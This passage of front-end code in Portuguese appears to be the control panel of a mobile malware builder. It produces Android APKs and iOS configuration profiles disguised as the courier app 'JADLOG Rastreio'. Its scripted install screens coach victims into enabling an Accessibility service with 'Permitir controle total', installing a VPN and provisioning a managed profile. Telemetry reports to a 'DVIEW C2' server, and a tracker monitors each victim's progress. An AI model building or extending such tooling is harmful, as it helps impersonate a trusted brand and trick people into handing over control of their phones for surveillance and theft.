          description: `O navegador Safari exibe o prompt nativo de segurança da Apple: 'Este site está tentando baixar um perfil de configuração. Deseja permitir?' para o aplicativo '${appName}'.`,
          acceptanceCriteria: "Download com Content-Type application/x-apple-aspen-config disparado via Safari."
        },
        {
          step: 2,
          name: "Tela 02",
          title: "Tela 02 — Perfil Descarregado no Dispositivo",
          subtitle: "Confirmação do Sistema iOS",
          badge: "DOWNLOADED",
          badgeColor: "#0284c7",
          systemPath: "iOS → Alerta do Sistema",
          description: "Diálogo oficial da Apple informando que o perfil de configuração foi baixado e orientando o usuário a revisar a instalação dentro do app Ajustes.",
          acceptanceCriteria: "Modal com mensagem 'Revise o perfil no app Ajustes se quiser instalá-lo' e botão Fechar."
        },
        {
          step: 3,
          name: "Tela 03",
          title: "Tela 03 — Menu Ajustes → Perfil Baixado",
          subtitle: "Destaque Superior na Lista de Configurações",
          badge: "SETTINGS",
          badgeColor: "#6366f1",
          systemPath: "Ajustes do iPhone → Perfil Baixado",
          description: `O aplicativo Ajustes exibe um card de destaque fixo no topo com a indicação 'Perfil Baixado: ${appName}', permitindo acesso direto à aprovação do perfil corporativo.`,
          acceptanceCriteria: "Seção de perfil baixado destacada no topo da interface de Ajustes do iOS."
        },
        {
          step: 4,
          name: "Tela 04",
          title: `Tela 04 — Detalhes do Perfil ${appName}`,
          subtitle: "Validação de Assinatura e Payloads",
          badge: "PROFILE_DETAILS",
          badgeColor: "#8b5cf6",
          systemPath: "Ajustes → Instalar Perfil",
          description: `Exibição das credenciais do perfil: '${appName}', Organização '${organizationName}' com selo Verificado ✓, e declaração dos payloads (WebClip Gerenciado e Túnel VPN Seguro).`,
          acceptanceCriteria: "Identificação da organização emissora, selo de verificação e botão 'Instalar'."
        },
        {
          step: 5,
          name: "Tela 05",
          title: "Tela 05 — Autenticação de Segurança do iPhone",
          subtitle: "Confirmação com Código de Desbloqueio",
          badge: "SECURITY_AUTH",
          badgeColor: "#ec4899",
          systemPath: "iOS Security → Digite o Código",
          description: "Tela nativa com dígitos de código do iPhone para validação de privilégios de instalação de perfis de gerenciamento.",
          acceptanceCriteria: "Autenticação biométrica ou PIN numérico validado pelo Secure Enclave."
        },
        {
          step: 6,
          name: "Tela 06",
          title: "Tela 06 — Aviso de Gerenciamento Corporativo",
          subtitle: "Consentimento de Acesso e MDM",
          badge: "MDM_CONSENT",
          badgeColor: "#f59e0b",
          systemPath: "Ajustes → Aviso de Gerenciamento",
          description: `Aviso oficial da Apple detalhando os direitos concedidos à organização '${organizationName}', incluindo instalação do WebClip na Home Screen e roteamento do túnel corporativo.`,
          acceptanceCriteria: "Declaração transparente de permissões corporativas sem contorno de segurança."
        },
        {
          step: 7,
          name: "Tela 07",
          title: "Tela 07 — Confirmação Final de Instalação",
          subtitle: "Sheet Inferior de Confirmação",
          badge: "INSTALL_PROMPT",
          badgeColor: "#ef4444",
          systemPath: "Ajustes → Ação de Instalação",
          description: "Ação de confirmação definitiva apresentada na base da tela com o botão destacado 'Instalar Perfil'.",
          acceptanceCriteria: "Confirmação voluntária e explícita do usuário para registro do perfil."
        },
        {
          step: 8,
          name: "Tela 08",
          title: "Tela 08 — Perfil Instalado com Sucesso",
          subtitle: "Registro Concluído no Sistema iOS",
          badge: "INSTALLED",
          badgeColor: "#10b981",
          systemPath: "Ajustes → Perfil Ativo",
          description: `O iOS confirma o registro do perfil: status 'Perfil Instalado' com visto verde e botão 'OK'. Os recursos corporativos ficam imediatamente disponíveis.`,
          acceptanceCriteria: "Perfil registrado no banco de perfis do iOS e botão OK habilitado."
        },
        {
          step: 9,
          name: "Tela 09",
          title: "Tela 09 — Conexão Automática do Túnel VPN",
          subtitle: "Ativação de Criptografia e Indicador [VPN]",
          badge: "VPN_ACTIVE",
          badgeColor: "#06b6d4",
          systemPath: "Ajustes → VPN & Rede",
          description: "O serviço de túnel IKEv2 é ativado. O ícone [VPN] passa a ser exibido na barra de status superior do iPhone, garantindo transmissão em tempo real.",
          acceptanceCriteria: "Túnel VPN conectado e ícone VPN presente na barra de status."
        },
        {
          step: 10,
          name: "Tela 10",
          title: "Tela 10 — Ícone na Tela de Início & App Pronto",
          subtitle: "Inicialização em Tela Cheia e Telemetria",
          badge: "READY",
          badgeColor: "#22c55e",
          systemPath: "Springboard → App em Execução",
          description: `O ícone de '${appName}' passa a residir na Tela de Início (Springboard) do iPhone. Ao abrir, executa em tela cheia com telemetria ativa sincronizada com o DVIEW C2.`,
          acceptanceCriteria: "WebClip instalado na Home Screen, túnel VPN conectado e telemetria sincronizada."
        }
      ];
    }

    // Android official steps
    return [
      {
        step: 1,
        name: "Tela 01",
        title: "Tela 01 — Confirmar Instalação",
        subtitle: "Instalador Nativo do Android",
        badge: "INSTALLING",
        badgeColor: "#3b82f6",
        systemPath: "Android OS → Diálogo de Instalação",
        description: `O sistema operacional apresenta o diálogo de confirmação oficial com o logotipo e nome '${appName}', mensagem 'Quer instalar este aplicativo?' e opções Cancelar e Instalar.`,
        acceptanceCriteria: "Diálogo oficial do instalador nativo com APK assinado e parâmetros validados."
      },
      {
        step: 2,
        name: "Tela 02",
        title: `Tela 02 — ${appName} em Instalação / Carregando`,
        subtitle: "Progresso do Pacote e Atualização",
        badge: "INSTALLING",
        badgeColor: "#2563eb",
        systemPath: "Android OS → Instalação em Andamento",
        description: `Tela branca oficial do instalador exibindo grade 2x2 com 4 blocos coloridos, card de ${appName}, barra de progresso com subtexto '${screenConfig.loadingSubtext || "aguarde, atualização em andamento..."}' e robô Android verde na base.`,
        acceptanceCriteria: "Fundo branco (#FFFFFF), 4 blocos coloridos 2x2, barra de progresso horizontal e mascote Android."
      },
      {
        step: 3,
        name: "Tela 03",
        title: `Tela 03 — Inicialização de ${appName}`,
        subtitle: "Splash Screen Escura e Spinner Ciano",
        badge: "INITIALIZING",
        badgeColor: "#00f0ff",
        systemPath: `${appName} → Splash Screen`,
        description: `Tela preta (#000000) com badge centralizado contendo a identidade de ${appName}, indicador de carregamento circular em arco ciano girando e copyright no rodapé.`,
        acceptanceCriteria: "Fundo preto (#000000), badge oficial da aplicação, spinner ciano giratório e copyright no rodapé."
      },
      {
        step: 4,
        name: "Tela 04",
        title: "Tela 04 — Configurações → Acessibilidade",
        subtitle: "Navegação no Menu Acessibilidade com Alerta",
        badge: "ACCESSIBILITY",
        badgeColor: "#0284c7",
        systemPath: "Configurações → Acessibilidade",
        description: "Tela oficial clara de Acessibilidade do Android. Destaque para o item 'Aplicativos instalados' com o ponto de notificação vermelho vivo (•), orientando onde o usuário deve clicar.",
        acceptanceCriteria: "Interface clara com categorias e ponto de notificação vermelho vivo em Aplicativos instalados."
      },
      {
        step: 5,
        name: "Tela 05",
        title: "Tela 05 — Acessibilidade → Aplicativos Instalados",
        subtitle: "Foco e Transição para Serviços Baixados",
        badge: "NAVIGATION",
        badgeColor: "#8b5cf6",
        systemPath: "Acessibilidade → Aplicativos instalados",
        description: "Aproximação e toque na seção 'Aplicativos instalados' indicada pelo ponto vermelho, direcionando para a lista de serviços de acessibilidade de terceiros.",
        acceptanceCriteria: "Transição visual clara para a lista de serviços baixados."
      },
      {
        step: 6,
        name: "Tela 06",
        title: `Tela 06 — ${appName} — Serviço OFF`,
        subtitle: "Lista de Serviços com Balão Flutuante de Orientação",
        badge: "SERVICE_OFF",
        badgeColor: "#ef4444",
        systemPath: `Aplicativos Instalados → ${appName}`,
        description: `Lista de aplicativos instalados exibindo '${appName} Off' e um balão flutuante escuro de instrução: '${screenConfig.speechCalloutText || "Este aplicativo requer permissão de acesso para funcionar. Por favor, permita para continuar."}'`,
        acceptanceCriteria: `Item ${appName} com status Off e balão de orientação interativo.`
      },
      {
        step: 7,
        name: "Tela 07",
        title: `Tela 07 — Configuração do Serviço ${appName}`,
        subtitle: "Chave Seletora do Serviço no Sistema",
        badge: "SERVICE_CONFIG",
        badgeColor: "#ec4899",
        systemPath: `Configurações do Serviço ${appName}`,
        description: "Tela de detalhes do serviço no Android com a chave toggle 'Desativado' / 'Off', aguardando o acionamento pelo usuário.",
        acceptanceCriteria: "Chave seletora disponível para ativação voluntária."
      },
      {
        step: 8,
        name: "Tela 08",
        title: "Tela 08 — Diálogo de Autorização do Sistema",
        subtitle: "Alerta Nativo de Segurança do Android",
        badge: "PERMISSION_PROMPT",
        badgeColor: "#f97316",
        systemPath: "Diálogo Nativo de Autorização Android",
        description: `Diálogo de confirmação de segurança do SO solicitando consentimento explícito: '${(screenConfig.permissionDialogTitle || "Permitir controle total para {appName}?").replace(/{appName}/g, appName)}' com botões Recusar e Permitir.`,
        acceptanceCriteria: "Modal nativo do Android exigindo confirmação explícita do usuário."
      },
      {
        step: 9,
        name: "Tela 09",
        title: "Tela 09 — Concessão e Ativação do Serviço",
        subtitle: "Comutação da Chave para Ativado",
        badge: "ACCESSIBILITY_ENABLED",
        badgeColor: "#10b981",
        systemPath: "Configurações → Serviço Ativado",
        description: "A chave seletora comuta para o estado 'Ativado', o Android inicia o serviço de acessibilidade em segundo plano e prepara o retorno ao app.",
        acceptanceCriteria: "Chave ativada com sucesso e serviço BIND_ACCESSIBILITY_SERVICE em execução."
      },
      {
        step: 10,
        name: "Tela 10",
        title: "Tela 10 — Ativação & Perfil Island Concluídos",
        subtitle: "Detecção Automática e Provisionamento de Container",
        badge: "READY",
        badgeColor: "#22c55e",
        systemPath: `${appName} → Interface Ativa & Perfil Island`,
        description: "O aplicativo detecta o serviço ativo via Settings.Secure, aciona a solicitação nativa de provisionamento de perfil de trabalho (Island / Managed Profile Android Enterprise), persiste estado 'completed' e sincroniza telemetria.",
        acceptanceCriteria: "INSTALLATION = SUCCESS | CONFIGURATION = SUCCESS | ISLAND_PROFILE = PROVISIONED | READY."
      }
    ];
  }, [platform, appName, organizationName, screenConfig]);

  const validationChecklistGroups = useMemo(() => {
    if (platform === "ios") {
      return [
        {
          title: "1. Safari & Download de Perfil",
          items: [
            { label: "MIME application/x-apple-aspen-config", activeAt: 1 },
            { label: "Prompt oficial de download no Safari", activeAt: 1 },
            { label: "Alerta 'Perfil Baixado' do iOS", activeAt: 2 },
            { label: "Card de destaque em Ajustes", activeAt: 3 }
          ]
        },
        {
          title: "2. Verificação & Segurança Apple",
          items: [
            { label: `Assinatura corporativa '${organizationName}'`, activeAt: 4 },
            { label: "Selo de verificação Verificado ✓", activeAt: 4 },
            { label: "Autenticação PIN / Código do iPhone", activeAt: 5 },
            { label: "Aviso de governança e permissões MDM", activeAt: 6 },
            { label: "Sheet de confirmação 'Instalar Perfil'", activeAt: 7 }
          ]
        },
        {
          title: "3. Ativação & Recursos Instalados",
          items: [
            { label: "Perfil registrado no banco de perfis do iOS", activeAt: 8 },
            { label: "Túnel VPN IKEv2 ativado na barra de status", activeAt: 9 },
            { label: "WebClip instalado na Tela de Início (Springboard)", activeAt: 10 },
            { label: "Telemetria do iPhone conectada ao DVIEW C2", activeAt: 10 }
          ]
        }
      ];
    }

    return [
      {
        title: "1. APK & Instalação (SO)",
        items: [
          { label: "APK válido e assinado", activeAt: 1 },
          { label: `Package ID ${packageName} configurado`, activeAt: 1 },
          { label: "Diálogo 'Quer instalar este aplicativo?'", activeAt: 1 },
          { label: "Tela branca com 4 blocos e barra de progresso", activeAt: 2 },
          { label: "Mascote Android verde na base da instalação", activeAt: 2 }
        ]
      },
      {
        title: "2. Aplicativo & Ciclo de Vida",
        items: [
          { label: `Tela inicial preta com badge oficial de ${appName}`, activeAt: 3 },
          { label: "Spinner em arco ciano girando no centro", activeAt: 3 },
          { label: `Copyright '© 25 ${appName}. ${screenConfig.copyrightText || "All Rights Reserved."}'`, activeAt: 3 },
          { label: "Acessibilidade Android com ponto vermelho de notificação", activeAt: 4 },
          { label: "Foco no item 'Aplicativos instalados'", activeAt: 5 },
          { label: "Balão flutuante de instrução e orientação", activeAt: 6 },
          { label: "Persistência em SharedPreferences do estado JSON", activeAt: 10 },
          { label: "Sincronização em tempo real com o servidor DVIEW", activeAt: 10 }
        ]
      },
      {
        title: "3. Acessibilidade & Perfil Island (MDM)",
        items: [
          { label: "DViewAccessibilityService declarado no Manifest", activeAt: 5 },
          { label: "Aparece em Acessibilidade → Aplicativos instalados", activeAt: 6 },
          { label: "Chave seletora com status inicial 'Off'", activeAt: 7 },
          { label: "Alerta oficial de segurança do Android autorizado", activeAt: 8 },
          { label: "Comutação da chave para 'Ativado'", activeAt: 9 },
          { label: "Detecção em tempo real via Settings.Secure", activeAt: 10 },
          { label: "Requisição nativa Perfil Island (ACTION_PROVISION_MANAGED_PROFILE)", activeAt: 10 },
          { label: "Receptor onProfileProvisioningComplete e container ativo", activeAt: 10 }
        ]
      }
    ];
  }, [platform, organizationName, packageName, appName, screenConfig]);

  return (
    <div className="apk-builder-master-view">
      {/* Toast Alert */}
      {toastMsg && (
        <div className="control-toast-alert">
          <Zap size={14} style={{ color: "var(--crimson-neon)" }} />
          <span>{toastMsg}</span>
        </div>
      )}

      {/* Main Container matching screenshot media_1789660520321.png */}
      <div className="apk-build-card-wrapper">
        {/* Header */}
        <div className="apk-build-header-section">
          <div>
            <h2 className="apk-build-main-title">BUILD ANDROID APK</h2>
            <p className="apk-build-sub-title">APKs gerados pelo sistema</p>
          </div>
          <button
            className="secondary"
            onClick={() => void fetchBuilds()}
            title="Atualizar lista de builds"
            style={{ padding: "6px 12px", display: "flex", alignItems: "center", gap: "6px" }}
          >
            <RefreshCw size={14} />
            <span>Atualizar</span>
          </button>
        </div>

        {/* 4 Stats Counters matching screenshot */}
        <div className="apk-stats-row">
          <div className="apk-stat-col">
            <span className="apk-stat-number">{stats.total}</span>
            <span className="apk-stat-label">TOTAL</span>
          </div>
          <div className="apk-stat-col">
            <span className="apk-stat-number text-success">{stats.completed}</span>
            <span className="apk-stat-label">CONCLUÍDOS</span>
          </div>
          <div className="apk-stat-col">
            <span className="apk-stat-number text-danger">{stats.failed}</span>
            <span className="apk-stat-label">FALHARAM</span>
          </div>
          <div className="apk-stat-col">
            <span className="apk-stat-number text-warning">{stats.progress}</span>
            <span className="apk-stat-label">EM PROGRESSO</span>
          </div>
        </div>

        {/* Local Save Path Banner Informing User Where APKs are Saved */}
        <div className="apk-save-path-card">
          <div style={{ display: "flex", alignItems: "center", gap: "10px", flex: 1 }}>
            <FolderOpen size={18} style={{ color: "var(--crimson-neon)", flexShrink: 0 }} />
            <div style={{ display: "flex", flexDirection: "column", gap: "2px" }}>
              <span style={{ fontSize: "11px", color: "#94a3b8", fontWeight: 600, letterSpacing: "0.5px" }}>
                DIRETÓRIO LOCAL DE SALVAMENTO:
              </span>
              {editingPath ? (
                <div style={{ display: "flex", gap: "6px", marginTop: "2px" }}>
                  <input
                    type="text"
                    value={tempPath}
                    onChange={(e) => setTempPath(e.target.value)}
                    style={{
                      padding: "4px 8px",
                      fontSize: "12px",
                      background: "#080a10",
                      border: "1px solid var(--crimson-neon)",
                      color: "#fff",
                      borderRadius: "4px",
                      width: "280px"
                    }}
                  />
                  <button
                    className="primary"
                    style={{ padding: "4px 10px", fontSize: "11px" }}
                    onClick={() => {
                      setSaveDirectory(tempPath);
                      setEditingPath(false);
                      showToast(`Pasta de destino atualizada para: ${tempPath}`);
                    }}
                  >
                    Salvar
                  </button>
                  <button
                    className="secondary"
                    style={{ padding: "4px 8px", fontSize: "11px" }}
                    onClick={() => setEditingPath(false)}
                  >
                    Cancelar
                  </button>
                </div>
              ) : (
                <code style={{ fontSize: "13px", color: "#f8fafc", fontFamily: "var(--font-mono)" }}>
                  {saveDirectory}
                </code>
              )}
            </div>
          </div>

          {!editingPath && (
            <div style={{ display: "flex", gap: "8px" }}>
              <button
                className="secondary compact-btn"
                onClick={() => {
                  setTempPath(saveDirectory);
                  setEditingPath(true);
                }}
                style={{ fontSize: "11px", padding: "5px 10px" }}
              >
                Alterar Pasta
              </button>
              <button
                className="secondary compact-btn"
                onClick={() => {
                  void navigator.clipboard.writeText(saveDirectory);
                  showToast("Caminho copiado.");
                }}
                style={{ fontSize: "11px", padding: "5px 10px" }}
              >
                Copiar Caminho
              </button>
            </div>
          )}
        </div>

        {/* Search Filter for Builds */}
        <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", gap: "10px", flexWrap: "wrap" }}>
          <div className="control-search-inline" style={{ maxWidth: "280px" }}>
            <Search size={14} style={{ color: "#64748b" }} />
            <input
              type="text"
              value={buildQuery}
              onChange={(e) => setBuildQuery(e.target.value)}
              placeholder="Buscar APK por nome ou pacote..."
            />
            {buildQuery && (
              <button className="control-clear-btn" onClick={() => setBuildQuery("")}>
                <X size={12} />
              </button>
            )}
          </div>
          <span style={{ fontSize: "11.5px", color: "#94a3b8" }}>
            Exibindo {filteredBuilds.length} de {builds.length} instaladores
          </span>
        </div>

        {/* Builds List matching screenshot */}
        <div className="apk-builds-list">
          {filteredBuilds.map((b) => (
            <div key={b.id} className="apk-build-item-row">
              {/* App Icon */}
              <div className="apk-item-icon-box">
                {b.logoDataUrl ? (
                  <img src={b.logoDataUrl} alt={b.appName} style={{ width: "100%", height: "100%", objectFit: "cover", borderRadius: "8px" }} />
                ) : (
                  <span className="apk-jadlog-logo">jad<span style={{ color: "#ffffff" }}>log</span></span>
                )}
              </div>

              {/* Title, Badges & Destination URL */}
              <div className="apk-item-info-col">
                <div className="apk-item-title-row">
                  <strong className="apk-item-name">{b.appName}</strong>
                  {b.platform === "ios" ? (
                    <span className="badge online" style={{ background: "rgba(56, 189, 248, 0.15)", color: "#38bdf8", border: "1px solid rgba(56, 189, 248, 0.4)", display: "inline-flex", alignItems: "center", gap: "4px", padding: "2px 7px", fontSize: "10.5px" }}>
                      <Apple size={11} /> Apple iOS
                    </span>
                  ) : (
                    <span className="badge online" style={{ background: "rgba(34, 197, 94, 0.15)", color: "#22c55e", border: "1px solid rgba(34, 197, 94, 0.4)", display: "inline-flex", alignItems: "center", gap: "4px", padding: "2px 7px", fontSize: "10.5px" }}>
                      <Smartphone size={11} /> Android APK
                    </span>
                  )}
                  <span className="apk-tag-concluido">Concluído</span>
                  <span className="apk-tag-lang">pt</span>
                  {b.vpnEnabled && (
                    <span className="badge online" style={{ fontSize: "10.5px", padding: "2px 7px" }}>
                      VPN {b.vpnProtocol || (b.platform === "ios" ? "IKEv2" : "TLS")}:{b.vpnPort || 8443}
                    </span>
                  )}
                  {(b.islandProfileEnabled || b.workProfileEnabled) && b.platform !== "ios" && (
                    <span className="badge online" style={{ background: "rgba(56, 189, 248, 0.15)", color: "#38bdf8", border: "1px solid rgba(56, 189, 248, 0.4)", fontSize: "10.5px", padding: "2px 7px", display: "inline-flex", alignItems: "center", gap: "4px" }}>
                      🏝️ Perfil Island
                    </span>
                  )}
                </div>
                <div style={{ display: "flex", alignItems: "center", gap: "10px", flexWrap: "wrap" }}>
                  <span className="apk-item-pkg">{b.bundleId || b.packageName}</span>
                  {b.redirectUrl && (
                    <span style={{ fontSize: "11px", color: "#38bdf8", display: "inline-flex", alignItems: "center", gap: "4px" }}>
                      <Globe size={11} /> {b.redirectUrl}
                    </span>
                  )}
                </div>
              </div>

              {/* Version & Date */}
              <div className="apk-item-date-col">
                <span>{b.version} - {b.date}</span>
              </div>

              {/* Actions: Baixar, Editar & Excluir */}
              <div className="apk-item-actions-col">
                <button
                  className="apk-btn-baixar"
                  onClick={() => handleDownloadBuild(b)}
                  title={b.platform === "ios" ? "Baixar Perfil Apple iOS (.mobileconfig) para instalação no Safari" : `Baixar APK para salvar em ${saveDirectory}`}
                  style={b.platform === "ios" ? { background: "linear-gradient(135deg, #0284c7, #0369a1)" } : undefined}
                >
                  <Download size={14} />
                  <span>{b.platform === "ios" ? "Perfil iOS" : "Baixar"}</span>
                </button>
                {b.platform === "ios" && (
                  <a
                    href={`${api.baseUrl}${b.downloadUrl}`}
                    download={`${b.appName.replace(/\s+/g, "-")}-swift.zip`}
                    className="secondary compact-btn"
                    title="Baixar Projeto Nativo Swift / Xcode (ZIP)"
                    style={{ textDecoration: "none", display: "inline-flex", alignItems: "center", gap: "4px", padding: "6px 10px", fontSize: "11px" }}
                  >
                    <Folder size={12} /> Xcode
                  </a>
                )}
                <button
                  className="secondary compact-btn"
                  onClick={() => openBuildQrModal(b)}
                  title="Visualizar QR Code de Instalação (0-Click & Scanner)"
                  style={{ display: "inline-flex", alignItems: "center", gap: "4px", padding: "6px 10px", fontSize: "11px" }}
                >
                  <QrCode size={13} style={{ color: "#38bdf8" }} />
                  <span>QR Code</span>
                </button>
                <button
                  className="secondary compact-btn"
                  onClick={() => openBuildTracker(b)}
                  title="Monitorar esteira de instalação do usuário em tempo real"
                  style={{ display: "inline-flex", alignItems: "center", gap: "4px", padding: "6px 10px", fontSize: "11px" }}
                >
                  <Activity size={13} style={{ color: "#22c55e" }} />
                  <span>Rastrear</span>
                </button>
                <button
                  className="apk-btn-edit"
                  onClick={() => openEditModal(b)}
                  title="Editar parâmetros deste instalador"
                >
                  <Pencil size={14} />
                </button>
                <button
                  className="apk-btn-delete"
                  onClick={() => handleDelete(b.id, b.appName)}
                  title="Excluir build do histórico"
                >
                  <Trash2 size={14} />
                </button>
              </div>
            </div>
          ))}

          {builds.length === 0 && (
            <div className="control-empty-hint" style={{ margin: "30px auto", textAlign: "center" }}>
              Nenhum APK gerado no momento. Clique em "+ Novo Build" abaixo para criar um novo instalador.
            </div>
          )}
        </div>

        {/* Footer Buttons: 2 Opções Explícitas de Geração */}
        <div className="apk-build-footer" style={{ display: "flex", gap: "12px", justifyContent: "flex-end", flexWrap: "wrap" }}>
          <button
            type="button"
            className="apk-btn-novo-build"
            onClick={() => {
              setTargetAction("qr");
              openCreateModal();
            }}
            style={{
              background: "linear-gradient(135deg, #0284c7, #0369a1)",
              border: "1px solid #38bdf8",
              boxShadow: "0 0 15px rgba(56, 189, 248, 0.25)"
            }}
            title="Criar novo build focado em QR Code 0-Click (Android Enterprise MDM)"
          >
            <QrCode size={16} />
            <span>+ Gerar QR Code (0-Click MDM)</span>
          </button>

          <button
            type="button"
            className="apk-btn-novo-build"
            onClick={() => {
              setTargetAction("apk");
              openCreateModal();
            }}
            style={{
              background: "linear-gradient(135deg, var(--crimson-neon), #991b1b)",
              border: "1px solid var(--crimson-neon)",
              boxShadow: "0 0 15px rgba(255, 26, 42, 0.25)"
            }}
            title="Criar novo build focado em download de APK direto e instalação via emulador ADB"
          >
            <Download size={16} />
            <span>+ Gerar APK (Download & Emulador)</span>
          </button>
        </div>
      </div>

      {/* Modal: Configurar/Editar APK + PREVIEW DE TODAS AS TELAS NO CELULAR */}
      {showModal && (
        <div className="app-config-modal-backdrop" onClick={() => setShowModal(false)}>
          <div
            className="app-config-modal-card"
            style={{ maxWidth: activeModalTab === "preview" ? "1140px" : "980px", width: "95vw", maxHeight: "92vh", overflowY: "auto" }}
            onClick={(e) => e.stopPropagation()}
          >
            {/* Modal Top Bar */}
            <div className="app-modal-header" style={{ flexDirection: "column", alignItems: "stretch", gap: "14px" }}>
              <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", width: "100%" }}>
                <div style={{ display: "flex", alignItems: "center", gap: "12px" }}>
                  {platform === "ios" ? (
                    <Apple size={24} style={{ color: "#38bdf8" }} />
                  ) : (
                    <Smartphone size={22} style={{ color: "var(--crimson-neon)" }} />
                  )}
                  <div>
                    <h3 style={{ margin: 0, fontSize: "18px", color: "#ffffff" }}>
                      {modalMode === "edit"
                        ? (platform === "ios" ? "Editar Perfil Apple iOS" : "Editar Parâmetros do APK")
                        : (platform === "ios" ? "Configurar e Gerar Perfil Apple iOS" : "Configurar e Compilar Novo APK")}
                    </h3>
                    <small style={{ color: "#94a3b8" }}>
                      {platform === "ios"
                        ? "Gera o Perfil de Configuração (.mobileconfig) para instalação OTA no Safari e projeto Swift nativo."
                        : "Gera o pacote Android assinado com criptografia AES-256 e visualização de todas as telas."}
                    </small>
                  </div>
                </div>

                {/* Navigation Tabs inside Modal: Formulário vs Preview de Telas */}
                <div style={{ display: "flex", alignItems: "center", gap: "10px" }}>
                  <div className="control-filter-tabs" style={{ margin: 0 }}>
                    <button
                      className={`control-filter-pill ${activeModalTab === "form" ? "active" : ""}`}
                      onClick={() => setActiveModalTab("form")}
                    >
                      <Edit3 size={13} /> {platform === "ios" ? "Parâmetros iOS" : "Parâmetros do APK"}
                    </button>
                    <button
                      className={`control-filter-pill ${activeModalTab === "screens" ? "active" : ""}`}
                      onClick={() => setActiveModalTab("screens")}
                    >
                      <Sparkles size={13} /> Customizar Telas
                    </button>
                    <button
                      className={`control-filter-pill ${activeModalTab === "preview" ? "active" : ""}`}
                      onClick={() => setActiveModalTab("preview")}
                    >
                      <Eye size={13} /> Preview Telas ({previewStep}/10)
                    </button>
                  </div>

                  <button className="modal-close-btn" onClick={() => setShowModal(false)}>
                    <X size={18} />
                  </button>
                </div>
              </div>

              {/* Segmented Platform Switcher: Android vs Apple iOS */}
              <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", borderTop: "1px solid rgba(255,255,255,0.06)", paddingTop: "10px" }}>
                <div className="platform-toggle-group">
                  <button
                    type="button"
                    className={`platform-btn android ${platform === "android" ? "active" : ""}`}
                    onClick={() => {
                      setPlatform("android");
                      if (appName === "DVIEW iOS Agent") setAppName("JADLOG Rastreio");
                    }}
                  >
                    <Smartphone size={15} />
                    <span>Android (.apk)</span>
                  </button>
                  <button
                    type="button"
                    className={`platform-btn ios ${platform === "ios" ? "active" : ""}`}
                    onClick={() => {
                      setPlatform("ios");
                      if (appName === "JADLOG Rastreio") setAppName("JADLOG Rastreio iOS");
                    }}
                  >
                    <Apple size={15} />
                    <span>Apple iOS (.mobileconfig / Swift)</span>
                  </button>
                </div>

                <span style={{ fontSize: "11px", color: platform === "ios" ? "#38bdf8" : "#22c55e", fontWeight: 600 }}>
                  {platform === "ios" ? "● Modo Apple iOS Ativo (OTA Profile + Swift)" : "● Modo Android Ativo (APK Nativo)"}
                </span>
              </div>
            </div>

            {/* TAB 1: FORMULÁRIO DE EDIÇÃO / CRIAÇÃO */}
            {activeModalTab === "form" && (
              <div>
                {activeResult ? (
                  <div style={{ padding: "16px 0", display: "flex", flexDirection: "column", gap: "16px" }}>
                    <div style={{ textAlign: "center" }}>
                      <span className="badge online" style={{ marginBottom: "8px" }}>
                        <ShieldCheck size={14} /> {platform === "ios" ? "Perfil Apple iOS Gerado com Sucesso!" : "Build Gerado com Sucesso!"}
                      </span>
                      <h3 style={{ margin: "6px 0", fontSize: "20px", color: "#ffffff" }}>
                        {activeResult.apkName}
                      </h3>
                      <p style={{ margin: 0, fontSize: "13px", color: "#94a3b8" }}>
                        {platform === "ios"
                          ? "Perfil assinado pronto para download no Safari e instalação em Ajustes."
                          : "Escolha abaixo como deseja instalar no dispositivo ou acompanhar o usuário:"}
                      </p>
                    </div>

                    {/* ABAS DO RESULTADO: 1. QR CODE | 2. APK DIRETO | 3. RASTREAMENTO */}
                    <div style={{
                      display: "flex",
                      gap: "8px",
                      background: "rgba(15, 23, 42, 0.7)",
                      padding: "6px",
                      borderRadius: "10px",
                      border: "1px solid #1e293b"
                    }}>
                      <button
                        type="button"
                        className={resultTab === "qr" ? "primary" : "secondary"}
                        onClick={() => setResultTab("qr")}
                        style={{
                          flex: 1,
                          display: "flex",
                          alignItems: "center",
                          justifyContent: "center",
                          gap: "6px",
                          padding: "10px 14px",
                          fontSize: "12.5px",
                          fontWeight: 700,
                          borderRadius: "8px",
                          cursor: "pointer"
                        }}
                      >
                        <QrCode size={16} />
                        <span>1. QR Code (0-Click MDM / Web)</span>
                      </button>

                      <button
                        type="button"
                        className={resultTab === "apk" ? "primary" : "secondary"}
                        onClick={() => setResultTab("apk")}
                        style={{
                          flex: 1,
                          display: "flex",
                          alignItems: "center",
                          justifyContent: "center",
                          gap: "6px",
                          padding: "10px 14px",
                          fontSize: "12.5px",
                          fontWeight: 700,
                          borderRadius: "8px",
                          cursor: "pointer"
                        }}
                      >
                        <Download size={16} />
                        <span>2. APK Direto & Emulador</span>
                      </button>

                      <button
                        type="button"
                        className={resultTab === "tracker" ? "primary" : "secondary"}
                        onClick={() => setResultTab("tracker")}
                        style={{
                          flex: 1,
                          display: "flex",
                          alignItems: "center",
                          justifyContent: "center",
                          gap: "6px",
                          padding: "10px 14px",
                          fontSize: "12.5px",
                          fontWeight: 700,
                          borderRadius: "8px",
                          cursor: "pointer",
                          position: "relative"
                        }}
                      >
                        <Activity size={16} />
                        <span>3. Rastreamento da Instalação</span>
                        {trackedSession && (
                          <span style={{
                            position: "absolute",
                            top: "-4px",
                            right: "-4px",
                            background: trackedSession.isStalled ? "#ef4444" : trackedSession.status === "completed" ? "#22c55e" : "#38bdf8",
                            color: "#fff",
                            fontSize: "9px",
                            padding: "2px 6px",
                            borderRadius: "10px",
                            fontWeight: 800
                          }}>
                            {(trackedSession.steps || trackedSession.history || []).length}
                          </span>
                        )}
                      </button>
                    </div>

                    {/* CONTEÚDO DA ABA 1: QR CODE */}
                    {resultTab === "qr" && (
                      <div style={{ display: "flex", flexDirection: "column", gap: "14px" }}>
                        {platform === "android" && (
                          <div style={{ display: "flex", gap: "10px", background: "rgba(15, 23, 42, 0.5)", padding: "4px", borderRadius: "8px", border: "1px solid #1e293b" }}>
                            <button
                              type="button"
                              className={qrMode === "zero_touch" ? "primary" : "secondary"}
                              onClick={() => setQrMode("zero_touch")}
                              style={{ flex: 1, justifyContent: "center", fontSize: "12px", padding: "8px", gap: "6px" }}
                            >
                              <Zap size={14} style={{ color: qrMode === "zero_touch" ? "#fff" : "#38bdf8" }} />
                              <span>Zero-Touch 0-Click (Android Enterprise MDM)</span>
                            </button>
                            <button
                              type="button"
                              className={qrMode === "web_scan" ? "primary" : "secondary"}
                              onClick={() => setQrMode("web_scan")}
